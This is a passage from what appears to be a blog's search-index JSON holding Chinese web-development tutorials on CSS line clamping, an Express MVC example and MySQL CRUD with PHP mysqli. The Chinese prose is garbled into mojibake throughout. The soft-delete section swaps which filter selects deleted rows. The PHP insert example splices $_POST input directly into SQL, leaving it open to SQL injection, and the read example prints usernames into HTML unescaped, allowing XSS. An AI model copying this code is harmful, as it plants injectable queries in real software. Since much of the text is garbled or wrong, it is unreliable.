çš„å±¬æ€§ä¾†é”æˆï¼Œé€™è£¡å…ˆç¤ºç¯„æ€éº¼åšå‡ºã€Œå¤šè¡Œæ–‡å­—â€¦ã€çš„æ•ˆæœï¼Œç­‰ç­‰å†ä¾†èªªæ˜ -weblit-box æ˜¯ä»€éº¼ã€‚ å‚™è¨»ï¼šå‰ç¶´å­—å·²ç¶“é€éœ²é€™åªèƒ½ç”¨åœ¨ webkit ç€è¦½å™¨ï¼Œä¹Ÿå°±æ˜¯ Google æˆ– Safariã€‚ HTMLï¼š 123456789101112131415161718&lt;style&gt; div { /* æ–°çš„ç›’å­ */ display: -webkit-box; /* è¨­å®šç›’å­å…§çš„æ’åˆ—æ–¹å‘ */ -webkit-box-orient: vertical; /* è¦é¡¯ç¤ºå¹¾è¡Œæ–‡å­— */ -webkit-line-clamp: 10; /* è¶…å‡ºçš„ç¯„åœéš±è— */ overflow: hidden; width: 300px; border: 1px solid #000; margin: 20px; }&lt;/style&gt;&lt;div&gt; Lorem ipsum dolor, sit amet consectetur adipisicing elit. Quas in iure ullam quia repellat. Voluptates excepturi debitis ipsam nulla pariatur saepe dolore dolor nesciunt, placeat recusandae blanditiis. Quae commodi eius sint at alias numquam adipisci nisi, consequatur repellat laboriosam dicta et similique nemo excepturi quasi in deleniti fugiat cupiditate aliquam neque iure iusto voluptatem. Ullam unde totam iure deleniti, molestias perspiciatis quis eaque eveniet distinctio! Dolore eligendi laborum, voluptatem eum explicabo culpa, nostrum blanditiis molestiae aliquam fugit veritatis pariatur nam enim? Perspiciatis porro molestias laboriosam sequi eveniet distinctio, reiciendis impedit vel? Harum esse facere ullam expedita quod tenetur, a repellat.&lt;/div&gt; Outputï¼š æ‰€ä»¥ä¸‹æ¬¡æ‡¶å¾—å¯« JS çš„è©±å¯ä»¥è€ƒæ…®ç”¨é€™å€‹æ–¹æ³•ä¾†åšï¼Œæœƒçœäº‹å¾ˆå¤šï½ é—œæ–¼ webkit-boxå®ƒè·Ÿ flex-box æœ‰ 87 åˆ†åƒï¼Œæ‰€ä»¥å¯ä»¥æƒ³æˆæ˜¯å¦ä¸€ç¨® flex å°±å¥½äº†ï¼ˆä½†é‚„æ˜¯ä¸ä¸€æ¨£å“¦ï¼‰ã€‚ é€™é‚Šåšä¸€å€‹ä¸€å€‹ç¤ºç¯„ä½ å°±å¤§æ¦‚æ‡‚äº†ï¼š 1234567891011121314151617181920212223242526&lt;style&gt; section { /* å¯ä»¥æƒ³æˆæ˜¯ display: flex */ display: -webkit-box; /* è·Ÿ align-item ä¸€æ¨£ */ -webkit-box-align: start; /* è·Ÿ flex-direction ä¸€æ¨£ å€¼æœ‰ horizontal è·Ÿ vertical */ -webkit-box-orient: horizontal; } div { width: 300px; border: 1px solid #000; margin: 20px; } div + div { /* flex: 1 */ -webkit-box-flex: 1; }&lt;/style&gt;&lt;section&gt; &lt;div&gt;Lorem ipsum, dolor sit amet consectetur adipisicing elit. Aut minus molestias adipisci, eos praesentium cum! Necessitatibus, a. Pariatur iusto rem ea natus nobis voluptatum distinctio, sed saepe, ex repudiandae magni?&lt;/div&gt; &lt;div&gt;Lorem ipsum dolor sit amet consectetur adipisicing elit. Et, ex quia, ipsa dolores repudiandae corrupti facere impedit, explicabo nobis optio suscipit temporibus harum ipsum accusamus quas. Illum quam qui debitis, quo fugit nisi eligendi, sit porro suscipit blanditiis praesentium, ducimus totam facilis illo omnis obcaecati quis saepe non adipisci. Alias, odit nulla totam reprehenderit cupiditate modi ab nostrum, dolor, incidunt ex perspiciatis velit illum deleniti eaque aperiam eos dolores laboriosam.&lt;/div&gt;&lt;/section&gt; å¤§æ¦‚çŸ¥é“ä¸€ä¸‹å°±å¥½ï¼Œä½ ä¸æœƒæƒ³æ‹¿é€™å€‹ä¾†æ’ç‰ˆï¼Œä¸»è¦ç”¨é€”é‚„æ˜¯ä¸Šé¢çš„å¤šè¡Œæ–‡å­—â€¦æ•ˆæœã€‚","link":"/2022/02/13/multiple-line-ellipsis/"},{"title":"MVC æ¶æ§‹èˆ‡åŸºæœ¬ç¯„ä¾‹","text":"å¥½ç”¨çš„æ¶æ§‹ã€‚ ä»€éº¼æ˜¯ MVCï¼Ÿå…ˆä¾†çœ‹å¼µåœ–ï¼š Modelï¼šå°±æ˜¯è·Ÿè³‡æ–™åº«æœ‰é—œçš„éƒ¨åˆ†ï¼Œå°ˆè·è™•ç†ã€Œè³‡æ–™ã€ç›¸é—œçš„æ“ä½œ Viewï¼šå°±æ˜¯è·Ÿç•«é¢æœ‰é—œçš„éƒ¨åˆ†ï¼Œæ ¹æ“šä¸Ÿé€²å»çš„ã€Œè³‡æ–™ã€ç”¢ç”Ÿã€Œç•«é¢ã€ Controllerï¼šè² è²¬æŒ‡æ® Model å°è³‡æ–™åº«åšä»€éº¼äº‹ï¼Œæˆ–æ˜¯çµ¦ View å°æ‡‰çš„è³‡æ–™ä¾†é¡¯ç¤ºï¼Œæœ€å¾Œå†æŠŠ response å›å‚³ ç¯„ä¾‹æ‹¿ Express ä¾†èˆ‰ä¾‹ï¼š 12345678910111213141516const express = require('express');const todoController = require('./controllers/todoController');const app = express();const port = 5000;// è¨­å®š view engine ç‚º EJSapp.set('view engine', 'ejs');// è·Ÿ todo æœ‰é—œçš„ request ä¸€å¾‹äº¤çµ¦ todoController è™•ç†app.get('/todos', todoController.getAll)// : ä»£è¡¨åƒæ•¸app.get('/todos/:id', todoController.get)app.listen(port, () =&gt; { console.log(`Example app listening on port ${port}`);}) Model åªè² è²¬æä¾›è³‡æ–™ï¼š 123456789101112const todos = ['first todo', 'second todo', 'third todo'];const todoModel = { // å›å‚³æ‰€æœ‰ todo getAll: () =&gt; { return todos; }, // å›å‚³å–®ä¸€ todo get: id =&gt; { return todos[id]; }}module.exports = todoModel Controller è² è²¬å”èª¿ Model å’Œ Viewï¼š 1234567891011121314151617181920// æŠŠ Model å¼•é€²ä¾†ï¼Œæ‰èƒ½è·Ÿ Model æºé€šconst todoModel = require('../models/todoModel');const todoController = { // å…ˆè·Ÿ Model æ‹¿è³‡æ–™ï¼Œåœ¨ä¸Ÿçµ¦ View getAll: (req, res) =&gt; { res.render('todos', { // è¦ render çš„è³‡æ–™ todos: todoModel.getAll() }) }, // å…ˆè·Ÿ Model æ‹¿è³‡æ–™ï¼Œåœ¨ä¸Ÿçµ¦ View get: (req, res) =&gt; { const id = req.params.id; res.render('todo', { // è¦ render çš„è³‡æ–™ todo: todoModel.get(id) }) }}module.exports = todoController View åªè² è²¬æ ¹æ“šè³‡æ–™é¡¯ç¤ºç•«é¢ï¼š 12345678// todos.ejs&lt;h1&gt;Todos&lt;/h1&gt;&lt;ul&gt; &lt;% for (const todo of todos) { %&gt; &lt;li&gt;&lt;%= todo %&gt;&lt;/li&gt; &lt;% } %&gt; &lt;/ul&gt; 123// todo.ejs&lt;h1&gt;Todos&lt;/h1&gt;&lt;h2&gt;&lt;%= todo %&gt;&lt;/h2&gt;","link":"/2022/03/25/mvc-basic/"},{"title":"MySQL ä¸­çš„å…§å»ºå‡½å¼","text":"æŠŠæˆ‘è¦ºå¾—ä¸éŒ¯ç”¨çš„è¨˜ä¸‹ä¾†ã€‚ å–å¾—ç›®å‰æ™‚é–“1SELECT NOW() AS now; è¨­å®šæ—¥æœŸæ ¼å¼æˆ‘æœ€å¸¸ç”¨ Xå¹´XæœˆXæ—¥ çš„æ ¼å¼ä¾†è¼¸å‡ºï¼Œæ‰€ä»¥é€™é‚Šæ‹¿é€™å€‹èˆ‰ä¾‹ï¼š 1SELECT DATE_FORMAT('2022-02-17 23:29:16', '%Yå¹´%cæœˆ%eæ—¥') AS formated; é †ä¾¿é™„ä¸Šç”¨ PHP çš„å¯«æ³•ï¼š 12345678910$date = '2022-02-17 23:29:16';$format = '%Yå¹´%cæœˆ%eæ—¥';$sql = \"SELECT DATE_FORMAT(?, ?) AS formated\";$stmt = $conn-&gt;prepare($sql);$stmt-&gt;bind_param('ss', $date, $format);$stmt-&gt;execute();$result = $stmt-&gt;get_result();$row = $result-&gt;fetch_assoc();$created_at = htmlspecialchars($row['formated']); æ›´å¤šçš„æ ¼å¼èªæ³•å¯ä»¥åƒè€ƒé€™è£¡ã€‚ è¨ˆç®—æ¬„ä½ç¸½æ•¸å‚™è¨»ï¼šCOUNT() è£¡é¢æ”¾è¦è¨ˆç®—çš„ columnã€‚ é€™é‚Šæ˜¯è¨ˆç®—æ²’è¢«åˆªé™¤çš„æ–‡ç« æ•¸é‡ï¼š 1SELECT COUNT(posts.id) AS total FROM posts WHERE posts.is_deleted = 0; æ‰¾å‡ºæ¬„ä½çš„æœ€å¤§å€¼å‚™è¨»ï¼šMAX() è£¡é¢æ”¾è¦è¨ˆç®—çš„ columnã€‚ é€™é‚Šæ˜¯æ‰¾å‡º id æœ€å¤§çš„æ¬„ä½ï¼š 1SELECT MAX(id) AS id FROM todos; è¨ˆç®—ç¸½å’Œé€™é‚Šæ˜¯æŠŠæ‰€æœ‰ id åŠ ç¸½çµæœï¼š é™„è¨»ï¼š12 + 18 + 19 + 20 + 21 1SELECT SUM(categories.id) AS sum FROM `categories`; è¨ˆç®—å¹³å‡å€¼é€™é‚Šæ˜¯æŠŠæ‰€æœ‰ id åŠ ç¸½å¾Œçš„å¹³å‡å€¼ï¼š é™„è¨»ï¼š90 / 5 1SELECT AVG(categories.id) AS average FROM `categories` æŠŠå¤šæ¬„åˆä½µæˆä¸€æ¬„é€™é‚Šæ˜¯æŠŠ id å’Œ name çµ¦åˆä½µæˆä¸€å€‹æ¬„ä½ï¼š 1SELECT CONCAT(categories.id, categories.name) AS id_and_name FROM `categories`;","link":"/2022/02/19/mysql-built-in-function/"},{"title":"MySQL é€£ç·šåˆ°è³‡æ–™åº«","text":"åœ¨ CRUD ä»¥å‰ã€‚ ç°¡è¿°1234567891011121314151617181920212223242526272829/* å››å€‹åƒæ•¸ï¼š 1. ä¸»æ©Ÿä½ç½® 2. ä½¿ç”¨è€…åç¨± 3. å¯†ç¢¼ 4. è³‡æ–™åº«åç¨±*/$server_name = 'localhost';$username = 'username';$password = '123456';$db_name = 'dbname'; // å›å‚³å€¼æ˜¯ä¸€å€‹ç‰©ä»¶$conn = new mysqli($server_name, $username, $password, $db_name);/* å¦‚æœ server æ²’æœ‰æ‰“é–‹éŒ¯ warning åµæ¸¬ï¼Œæœ€å¥½æ˜¯è‡ªå·± checkï¼Œ é€™ç‰©ä»¶ä¸‹æœ‰ connect_errno å¯ä»¥æª¢æŸ¥ï¼Œæœ‰éŒ¯èª¤çš„è©±å€¼æœƒæ˜¯ 1ï¼Œ*/if ($conn-&gt;connect_errno) { // æœ‰éŒ¯èª¤å°±æŠŠéŒ¯èª¤è¨Šæ¯å°å‡ºä¾† die('è³‡æ–™åº«é€£ç·šéŒ¯èª¤ï¼š' . $conn-&gt;connect_error);}// è¨­å®šç·¨ç¢¼$conn-&gt;query('SET NAMES UTF8');// è¨­å®šæ™‚å€$conn-&gt;query('SET time_zone = \"+8:00\"');?&gt; é€šå¸¸æœƒå¦å¤–é–‹ä¸€å€‹ conn.php ä¾†å„²å­˜é€£åˆ°è³‡æ–™åº«çš„ codeï¼Œé€™æ¨£å°±å¯ä»¥ç›´æ¥åœ¨å…¶ä»–æª”æ¡ˆä¸­ï¼š 1require_once('conn.php') å¦å¤–è¦å°è³‡æ–™åº«åšä»»ä½•æ“ä½œéƒ½æœƒç”¨åˆ° -&gt;query é€™å€‹æŒ‡ä»¤ï¼Œç‰¹åˆ¥å¼·èª¿ä¸€ä¸‹ã€‚","link":"/2022/02/03/mysql-connect-to-data-base/"},{"title":"MySQL å»ºç«‹æ–°è³‡æ–™åˆ°è³‡æ–™åº«","text":"æ–°å¢è³‡æ–™ ç°¡è¿°è¦çœ‹å‰ç«¯æ˜¯ç”¨ POST é‚„æ˜¯ GET ä¾†å¸¶è³‡æ–™çš„ï¼š 12345678910111213141516171819&lt;?php// æŠŠå‰ç«¯å¸¶éä¾†çš„è³‡æ–™å­˜èµ·ä¾†$username = $_POST['username'];// å­—ä¸²æ‹¼æ¥å¯«æ³•$sql = 'INSERT INTO users(username) VALUES(\"' . $username . '\")';// sprintf å¯«æ³•$sql2 = sprintf('INSERT INTO users (username) VALUES (\"%s\")', $username);// ä¸‹ query æŒ‡ä»¤$result = $conn-&gt;query($sql2);// æª¢æŸ¥å›å‚³å€¼if (!$result) { die($conn-&gt;error);}// åœ¨ response header åŠ ä¸Šé€™æ®µ = é‡æ–°å°å‘header('Location: index.php');?&gt;","link":"/2022/02/03/mysql-create-data/"},{"title":"MySQL JOIN èªæ³•","text":"æƒ³åœ¨è¤‡ç¿’ä¸€æ¬¡ã€‚ ç°¡è¿°é—œè¯å¼è³‡æ–™åº«æœ€é‡è¦çš„å°±æ˜¯ã€Œé—œè¯ã€ï¼Œç•¶æˆ‘å€‘è¦æŠŠå…©å€‹ table ç”¨æŸå€‹æ¬„ä½çµ¦é—œè¯èµ·ä¾†æ™‚å°±æœƒç”¨åˆ° JOIN çš„èªæ³•ï¼Œåœ¨é‚£ä¹‹å‰å…ˆèªè­˜ä¸€ä¸‹ JOIN çš„ç¨®é¡ï¼š ï¼ˆINNERï¼‰ JOIN äº¤é›† LEFT JOIN åˆä½µåˆ°å·¦é‚Šçš„ table RIGHT JOIN åˆä½µåˆ°å³é‚Šçš„ table OUTER JOIN è¯é›† åƒè€ƒé€™å¼µåœ–æœƒå¥½ç†è§£å¾ˆå¤šï¼š ï¼ˆINNERï¼‰ JOIN åœ¨ Users çš„ ID æœ‰ 1 2 3 4 5ï¼ŒLikes çš„ User ID æœ‰ 3 1 1 6 4ã€‚INNER JOIN å°±æ˜¯æŠŠå…©å€‹ table æœ‰å°æ‡‰åˆ°çš„é—œè¯æ¬„ä½ç•™ä¸‹ä¾†ã€‚ ä¸Šé¢çš„ä¾‹å­æ˜¯ 1 3 4ï¼Œæœ€å¾ŒåªæœƒæŠŠå‡ºç¾ 1 3 4 çš„æ¬„ä½åˆåœ¨ä¸€èµ·ã€‚ LEFT JOINï¼ˆæœ€å¸¸ç”¨ï¼‰ åœ¨ Users çš„ ID æœ‰ 1 2 3 4 5ï¼ŒLikes çš„ User ID æœ‰ 3 1 1 6 4ã€‚LEFT JOIN å°±æ˜¯æŠŠå·¦é‚Šçš„ table å…¨éƒ¨ç•™ä¸‹ï¼Œå³é‚Šåªç•™ä¸‹æœ‰å°æ‡‰çš„æ¬„ä½ã€‚ æ‰€ä»¥ Users æœƒå…¨éƒ¨ç•™ä¸‹ï¼Œè€Œ Likes åªç•™ä¸‹ 3 1 1 4ï¼Œæ²’å°æ‡‰çš„åœ°æ–¹å°±ç”¨ null ä¾†å¡«ã€‚ RIGHT JOIN åœ¨ Users çš„ ID æœ‰ 1 2 3 4 5ï¼ŒLikes çš„ User ID æœ‰ 3 1 1 6 4ã€‚RIGHT JOIN å°±æ˜¯æŠŠå³é‚Šçš„ table å…¨éƒ¨ç•™ä¸‹ï¼Œå·¦é‚Šåªç•™ä¸‹æœ‰å°æ‡‰çš„æ¬„ä½ã€‚ æ‰€ä»¥ Likes æœƒå…¨éƒ¨ç•™ä¸‹ï¼Œè€Œ Users åªç•™ä¸‹ 1 3 4ï¼Œæ²’å°æ‡‰çš„åœ°æ–¹å°±ç”¨ null ä¾†å¡«ã€‚ OUTER JOIN åœ¨ Users çš„ ID æœ‰ 1 2 3 4 5ï¼ŒLikes çš„ User ID æœ‰ 3 1 1 6 4ã€‚OUTER JOIN å°±æ˜¯æŠŠä¸ç®¡æœ‰æ²’æœ‰é—œè¯éƒ½ç•™ä¸‹ã€‚ æ‰€ä»¥ Users è·Ÿ Likes æœƒå…¨éƒ¨ç•™ä¸‹ï¼Œæ²’å°æ‡‰çš„åœ°æ–¹å°±ç”¨ null ä¾†å¡«ã€‚","link":"/2022/02/14/mysql-join/"},{"title":"MySQL è®€å–è³‡æ–™åº«ä¸­çš„è³‡æ–™","text":"è®€å–è³‡æ–™ã€‚ ç°¡è¿°12345678910111213141516171819202122232425262728293031323334&lt;?php // æŠŠé€£åˆ° DB çš„æª”æ¡ˆå¼•å…¥ require_once('conn.php'); // ä¸‹ sql æŒ‡ä»¤æ˜¯é€é $conn ä¸æ˜¯ $result $result = $conn-&gt;query('SELECT * FROM users ORDER BY id ASC'); // æª¢æŸ¥çµæœæœ‰æ²’æœ‰å€¼ if (!$result) { // æ²’æœ‰çš„è©±é¡¯ç¤ºéŒ¯èª¤è¨Šæ¯ die($conn-&gt;error); } $format = ' &lt;div class=\"user\"&gt; &lt;p class=\"user__id\"&gt;id: %d&lt;/p&gt; &lt;p class=\"user__name\"&gt;username: %s&lt;/p&gt; &lt;a class=\"user__button\" href=\"delete.php?id=%d\"&gt;åˆªé™¤&lt;/a&gt; &lt;/div&gt; '; /* å¯æƒ³æˆæ˜¯ $row = $result-&gt;fetch_assoc() while ($row) {...} $row = $result-&gt;fetch_assoc() while ($row) {...} */ while($row = $result-&gt;fetch_assoc()) { // æŠŠæ‰€æœ‰çš„ id æ¬„ä½è·Ÿ username å°å‡ºä¾† echo sprintf($format, $row['id'], $row['username'], $row['id'] ); }?&gt; é—œæ–¼ $result-&gt;fetch_assoc() çš„éƒ¨åˆ†å¯ä»¥æƒ³æˆæ˜¯é€™æ¨£ï¼š 12345678910111213&lt;?php // ç¬¬ä¸€å€‹ row $row = $result-&gt;fetch_assoc(); print_r($row); // ç¬¬äºŒå€‹ row $row = $result-&gt;fetch_assoc(); print_r($row); // ç¬¬ä¸‰å€‹ row $row = $result-&gt;fetch_assoc(); print_r($row);?&gt;","link":"/2022/02/03/mysql-read-data/"},{"title":"MySQL å¾è³‡æ–™åº«ä¸­åˆªé™¤è³‡æ–™","text":"åˆªé™¤è³‡æ–™ã€‚ ç°¡è¿°ä¸€èˆ¬æ˜¯å»ºè­°å‰ç«¯ç”¨ POST ä¾†å¸¶è³‡æ–™ï¼Œé€™é‚Šæ˜¯å·æ‡¶æ‰ç”¨ GETï¼š 12345678910111213141516171819202122232425&lt;?phprequire_once('conn.php');// å–å¾—å‰ç«¯é€ä¾†çš„è³‡æ–™$id = $_GET['id'];// æª¢æŸ¥æ˜¯ä¸æ˜¯ç©ºå€¼if (empty($id)) { die('è«‹è¼¸å…¥ id');}// sprintf å¯«æ³•$sql2 = sprintf('DELETE FROM users WHERE id=%d', $id);// ä¸‹ query æŒ‡ä»¤$result = $conn-&gt;query($sql2);// æª¢æŸ¥å›å‚³å€¼if (!$result) { die($conn-&gt;error);}// æª¢æŸ¥å½±éŸ¿äº†å¹¾åˆ—ï¼ˆçœ‹ä¸‹é¢è£œå……å…§å®¹ï¼‰if ($conn-&gt;affected_rows &gt;= 1) { echo 'åˆªé™¤æˆåŠŸ';} else { echo 'æŸ¥ç„¡è³‡æ–™';}&gt; è¦ç‰¹åˆ¥æ³¨æ„çš„æ˜¯ï¼Œå° MySQL ä¾†èªªåªæœ‰ã€Œå°ä¸å­˜åœ¨çš„æ¬„ä½åšæ“ä½œã€æ‰ç®—æ˜¯éŒ¯èª¤ï¼Œä¸ç„¶åªæœƒè¢«è¦–ç‚ºæ˜¯ã€Œå½±éŸ¿ä¸å­˜åœ¨çš„è³‡æ–™ã€è€Œå·²ï¼Œåƒè€ƒé€™å€‹ä¾‹å­ï¼š 12345&lt;?php require_once('conn.php'); $result = $conn-&gt;query('DELETE FROM users WHERE id=200'); echo $result // 1ï¼Œä»£è¡¨åŸ·è¡ŒæˆåŠŸ?&gt; é€™æ™‚å€™å¦‚æœåªæª¢æŸ¥ $result å°±ä¸å¤ªç²¾æº–ï¼Œå»ºè­°åŠ ä¸Š $conn-&gt;affected_rows ä¾†æŸ¥çœ‹å¯¦éš›å½±éŸ¿äº†å¹¾åˆ—ï¼š 123456&lt;?phprequire_once('conn.php');$result = $conn-&gt;query('DELETE FROM users WHERE id=32');echo $result . '&lt;br&gt;'; // 1echo $conn-&gt;affected_rows; // 0?&gt; å¤§æ¦‚å°±æ˜¯é€™æ¨£å›‰ã€‚","link":"/2022/02/03/mysql-delete-data/"},{"title":"MySQL ä¸­çš„ soft delete èˆ‡ hard delete","text":"è®“æˆ‘æƒ³èµ· Git è£¡çš„ git reset â€“soft â€“hardã€‚ ç°¡è¿°æ‹¿é€™å€‹ table ä¾†èˆ‰ä¾‹ï¼š hard deleteæ„æ€å°±æ˜¯çœŸçš„æŠŠè³‡æ–™åº«è£¡çš„è³‡æ–™ç›´æ¥åˆªé™¤ 1DELETE FROM comments WHERE username='peanu'; åŸ·è¡Œå®Œå¾Œ peanu çš„ç•™è¨€å°±çœŸçš„çœŸçš„æ¶ˆå¤±äº†ï¼Œæ²’è¾¦æ³•å¾©åŸã€‚ soft deleteæ„æ€æ˜¯ç”¨ç‹€æ…‹ä¾†è¡¨ç¤ºï¼Œè€Œä¸æ˜¯çœŸçš„æŠŠè³‡æ–™åˆªæ‰ã€‚ é€šå¸¸æœƒæ–°å¢ä¸€å€‹å«åš is_deleted çš„æ¬„ä½ï¼Œç”¨ 0 æˆ– 1 ä¾†è¡¨ç¤ºé€™å€‹æ¬„ä½æ˜¯ä¸æ˜¯è™•æ–¼ã€Œåˆªé™¤ç‹€æ…‹ã€ã€‚å¦‚æœçœŸçš„ä¸å°å¿ƒã€Œèª¤åˆªã€è³‡æ–™çš„è©±é‚„æœ‰æ©Ÿæœƒå¯ä»¥æ•‘å›ä¾†ã€‚ è¦åˆªé™¤æ¬„ä½çš„è©±åªè¦æ›´æ–°æ¬„ä½ç‹€æ…‹å°±å¯ä»¥äº†ï¼š 1UPDATE comments SET is_deleted=1 WHERE id=160; ç¾åœ¨ id=160 çš„ is_delete ç‹€æ…‹è®Šæˆ 1ï¼Œä»£è¡¨åˆªé™¤ã€‚ æ ¹æ“šç‹€æ…‹ä¾†éæ¿¾è³‡æ–™è£œå……ä¸€ä¸‹è¦æ€éº¼æ­£ç¢ºçš„éæ¿¾è³‡æ–™ã€‚å¦‚æœä¸æ˜¯ç”¨ 0 1 ä¾†è¡¨ç¤ºç‹€æ…‹çš„è©±ï¼Œä¸èƒ½ç›´æ¥ç”¨ is_deleted != null ä¾†é¸ï¼Œè€Œæ˜¯è¦ç”¨ IS æˆ– IS NOT ä¾†éæ¿¾ã€‚ ä¾‹å¦‚è¦æŠŠè¢«åˆªé™¤çš„è³‡æ–™æŠ“å‡ºä¾†ï¼š 1SELECT * FROM `comments` WHERE is_deleted IS NOT null; å¦‚æœæƒ³æŠŠæ²’è¢«åˆªé™¤çš„è³‡æ–™æŠ“å‡ºä¾†ï¼š 1SELECT * FROM `comments` WHERE is_deleted IS null; ä½†å¦‚æœæ˜¯ç”¨ 0 1 çš„è©±å°±å¯ä»¥ç›´æ¥ is_deleted !=0 æˆ– is_deleted = 0 ä¾†æŠ“è³‡æ–™ã€‚ è¢«åˆªé™¤çš„ï¼š 1SELECT * FROM `comments` WHERE is_deleted = 0; æ²’è¢«åˆªé™¤çš„ï¼š 1SELECT * FROM `comments` WHERE is_deleted != 0;","link":"/2022/02/14/mysql-soft-and-hard-delete/"},{"title":"MySQL èªæ³•","text":"æ‡¶äººåŒ…ã€‚ åŸºç¤è®€å–å£è¨£ï¼šå¾å“ªå€‹ã€Œtableã€é¸åˆ°å“ªå€‹ã€Œæ¬„ä½ã€ï¼š ä¸»çµæ§‹ï¼šSELECT â€¦ FROM â€¦ WHERE â€¦ 1SELECT * FROM users; ä»£è¡¨ users é€™å€‹ table ä¸­çš„æ‰€æœ‰æ¬„ä½ã€‚ 12SELECT id FROM users;SELECT users.id FROM users; ä»£è¡¨ users é€™å€‹ table ä¸­çš„ id æ¬„ä½ã€‚ 12SELECT id, content FROM users;SELECT users.id, users.content FROM users; ä»£è¡¨ users é€™å€‹ table ä¸­çš„ id è·Ÿ content æ¬„ä½ã€‚ 1SELECT content as text FROM users; ä»£è¡¨ users é€™å€‹ table ä¸­çš„ content æ¬„ä½ï¼Œä½†æˆ‘è¦æŠŠé€™å€‹æ¬„ä½åç¨±æ”¹æˆ text 1SELECT * FROM users WHERE username='PeaNu' ä»£è¡¨ users é€™å€‹ table ä¸­ username æ˜¯ PeaNu çš„æ‰€æœ‰æ¬„ä½ã€‚ 1SELECT * FROM users WHERE username='PeaNu' AND id=1; ä»£è¡¨ users é€™å€‹ table ä¸­ username æ˜¯ PeaNu ä¸” id æ˜¯ 1 çš„ æ‰€æœ‰æ¬„ä½ã€‚ 1SELECT * FROM users WHERE username='aaa' OR id=1; ä»£è¡¨ users é€™å€‹ table ä¸­ username æ˜¯ aaa æˆ– id æ˜¯ 1 çš„ æ‰€æœ‰æ¬„ä½ã€‚ 1SELECT * FROM users ORDER BY id ASC ä»£è¡¨å¾ users é€™å€‹ table æ‹¿å‡ºæ‰€æœ‰æ¬„ä½ï¼Œä¸¦æŒ‰ç…§ã€Œidã€ä¾†å‡å†ªæ’åºã€‚ å‚™è¨»ï¼šé™å†ªçš„è©±æŠŠ ASC æ”¹æˆ DESC æ–°å¢å£è¨£ï¼šæŠŠ ã€Œxxxã€ æ–°å¢åˆ°æŸå€‹ ã€Œtableã€ è£¡é¢ã€‚ ä¸»çµæ§‹ï¼šINSERT INTO â€¦ VALUES â€¦ 1INSERT INTO users (username, content) VALUES ('PPB', 'Hi'); æŠŠ username='PPB' å’Œ content='HI' æ–°å¢åˆ° users é€™å€‹ tableã€‚ ä¿®æ”¹å£è¨£ï¼šæŠŠ tablue ä¸­çš„ ã€Œxxxã€ä¿®æ”¹æˆã€Œoooã€ã€‚ ä¸»çµæ§‹ï¼šUPDATE â€¦ SET â€¦ WHERE â€¦ 1UPDATE users SET username='ABC', content='GOGOGO' WHERE id=3; è¨˜å¾—é€™é‚Šçš„ WHERE å¾ˆé‡è¦ï¼Œå¦‚æœæ²’æœ‰æŒ‡å®šæ¢ä»¶æœƒæŠŠæ‰€æœ‰æ¬„ä½éƒ½æ”¹æ‰ã€‚ 1UPDATE users SET username='PeaNu' WHERE 1; é€™æ¨£æ‰€æœ‰çš„ username æ¬„ä½éƒ½æœƒè®Šæˆ PeaNuã€‚ åˆªé™¤å¾å“ªå€‹ã€Œtableã€åˆªé™¤æŸå€‹ã€Œæ¬„ä½ã€ã€‚ ä¸»çµæ§‹ï¼šDELETE FROM â€¦ WHERE â€¦ 1DELETE FROM users WHERE name='PeaNu'; ä¸€æ¨£è¦æ³¨æ„ WHEREï¼Œå¦‚æœå¯«æˆ WHERE 1 ä»£è¡¨æŠŠæ‰€æœ‰æ¬„ä½åˆªé™¤ã€‚ é¡¯ç¤ºå¹¾ç­†è³‡æ–™é€šå¸¸ç”¨ä¾†åšåˆ†é æ•ˆæœï¼š 1SELECT * FROM users LIMIT 5 æ„æ€æ˜¯é¡¯ç¤ºäº”ç­†è³‡æ–™ã€‚ è·³éå¹¾ç­†è³‡æ–™é€šå¸¸ç”¨ä¾†åšåˆ†é æ•ˆæœï¼š 1SELECT * FROM users OFFSET 5; æ„æ€æ˜¯è·³éå‰äº”ç­†è³‡æ–™ã€‚ è¨­å®šç¯„åœä¾‹å¦‚æƒ³æ‰¾å‡º id åœ¨ 15 åˆ° 20 ä¹‹é–“çš„æ¬„ä½ï¼Œæˆ‘å¯ä»¥ï¼š 1SELECT * FROM `categories` WHERE id BETWEEN 15 AND 20; é€™æ¨£å°±æœƒæŠŠ id æ˜¯ 15 16 17 18 19 20 çš„æ¬„ä½æ’ˆå‡ºä¾†ï¼ˆæ³¨æ„æœ‰åŒ…å« 15 å’Œ 20ï¼‰ æŒ‡å®šå¤šå€‹å€¼åŸæœ¬è¦æ‰¾ id ç‚º 1 2 3 çš„è³‡æ–™æœƒé€™æ¨£å¯«ï¼š 1SELECT * FROM `categories` WHERE id=1 OR id=2 OR id=3; ä½†å…¶å¯¦æœ‰æ›´ç°¡æ½”çš„å¯«æ³•ï¼š 1SELECT * FROM `categories` WHERE id IN(1, 2, 3); å­—ä¸²æœå°‹ç›´æ¥ç”¨ç¯„ä¾‹ä¾†è§£é‡‹ï¼š æ‰¾å‡ºæœ‰åŒ…å« i é€™å€‹å­—çš„æ¬„ä½ 1SELECT * FROM `categories` WHERE name LIKE '%i%'; æ‰¾å‡ºä»¥ i é–‹é ­çš„æ¬„ä½ï¼š 1SELECT * FROM `categories` WHERE name LIKE 'i%'; æ‰¾å‡ºä»¥ i çµå°¾çš„æ¬„ä½ï¼š 1SELECT * FROM `categories` WHERE name LIKE '%i'; æ‰¾å‡ºä¸‰å€‹å­—ï¼Œä¸”è£¡é¢æœ‰åŒ…å« i çš„æ¬„ä½ï¼š 12SELECT * FROM `categories` WHERE name LIKE '_i%';SELECT * FROM `categories` WHERE name LIKE '%i_'; å¯«é€™éº¼å¤šç¯„ä¾‹æœ€ä¸»è¦æ˜¯è¦ä½ äº†è§£ % è·Ÿ _ åœ¨å¹¹å˜›ç”¨çš„ã€‚ % ä»£è¡¨ä»»æ„å­—å…ƒï¼Œæ‰€ä»¥ %i% ä»£è¡¨é–‹é ­å’Œçµå°¾å¯ä»¥æ˜¯ä»»æ„å­—å…ƒã€‚ä½† i% å°±ä¸ä¸€æ¨£äº†ï¼Œæ„æ€æ˜¯ i + ä»»æ„å­—å…ƒ çš„çµ„åˆæ‰æ­£ç¢ºï¼ˆæœ‰é»é¡ä¼¼æ­£å‰‡è¡¨é”è£¡çš„ patternï¼‰ï¼Œé€™å…©å€‹è¦åˆ†æ¸…æ¥šæ‰ä¸æœƒæéŒ¯ã€‚ _ ä¹Ÿæ˜¯ä»£è¡¨ä»»æ„å­—å…ƒï¼Œå·®åˆ¥æ˜¯å¯ä»¥ã€Œé™åˆ¶ç¸½å­—æ•¸ã€ï¼Œæ‰€ä»¥ %i_ 